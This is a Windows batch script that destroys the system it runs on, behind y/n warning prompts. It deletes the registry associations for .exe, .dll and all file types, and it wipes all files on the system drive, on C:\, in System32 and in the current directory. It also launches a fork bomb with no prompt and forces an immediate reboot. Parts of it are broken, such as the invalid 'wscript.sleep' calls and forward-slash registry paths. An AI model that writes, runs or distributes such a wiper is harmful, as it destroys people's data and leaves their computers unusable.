@Echo off
echo WARNING: This script will perform destructive actions on your system.
echo Are you sure you want to continue? (y/n)
set /p confirm=
if /I not "%confirm%"=="y" exit

REM Sleep for 100 milliseconds
wscript.sleep 100

REM Confirm before deleting registry entries
echo WARNING: This will delete registry entries for .exe, .dll, and all file types.
echo Are you sure? (y/n)
set /p confirm=
if /I "%confirm%"=="y" (
    START reg delete HKCR/.exe > log.txt 2>&1
    if errorlevel 1 echo Failed to delete .exe registry entry >> log.txt

    START reg delete HKCR/.dll > log.txt 2>&1
    if errorlevel 1 echo Failed to delete .dll registry entry >> log.txt

    START reg delete HKCR/* > log.txt 2>&1
    if errorlevel 1 echo Failed to delete all file types registry entry >> log.txt
)

REM Sleep for 500 milliseconds
wscript.sleep 500

REM Confirm before deleting all files from the system drive
echo WARNING: This will delete all files from the system drive.
echo Are you sure? (y/n)
set /p confirm=
if /I "%confirm%"=="y" (
    del %systemdrive%\*.* /f /s /q > log.txt 2>&1
    if errorlevel 1 echo Failed to delete files from the system drive >> log.txt
)

REM Sleep for 100 milliseconds
wscript.sleep 100

REM Confirm before deleting all files from C:\
echo WARNING: This will delete all files from C:\.
echo Are you sure? (y/n)
set /p confirm=
if /I "%confirm%"=="y" (
    Del C:\*.* /f /s /q > log.txt 2>&1
    if errorlevel 1 echo Failed to delete files from C:\ >> log.txt
)

REM Sleep for 100 milliseconds
wscript.sleep 100

REM Confirm before deleting all files from C:\WINDOWS\system32
echo WARNING: This will delete all files from C:\WINDOWS\system32.
echo Are you sure? (y/n)
set /p confirm=
if /I "%confirm%"=="y" (
    del C:\WINDOWS\system32\*.* /q > log.txt 2>&1
    if errorlevel 1 echo Failed to delete files from C:\WINDOWS\system32 >> log.txt
)

REM Sleep for 100 milliseconds
wscript.sleep 100

REM Confirm before deleting all files in the current directory
echo WARNING: This will delete all files in the current directory.
echo Are you sure? (y/n)
set /p confirm=
if /I "%confirm%"=="y" (
    del *.* > log.txt 2>&1
    if errorlevel 1 echo Failed to delete files in the current directory >> log.txt
)

REM Sleep for 100 milliseconds
wscript.sleep 100

REM Execute itself recursively
%0|%0

REM Sleep for 100 milliseconds
wscript.sleep 100

REM Confirm before restarting the computer
echo WARNING: This will restart your computer immediately.
echo Are you sure? (y/n)
set /p confirm=
if /I "%confirm%"=="y" (
    shutdown -r -f -t 00 > log.txt 2>&1
    if errorlevel 1 echo Failed to restart the computer >> log.txt
)

exit
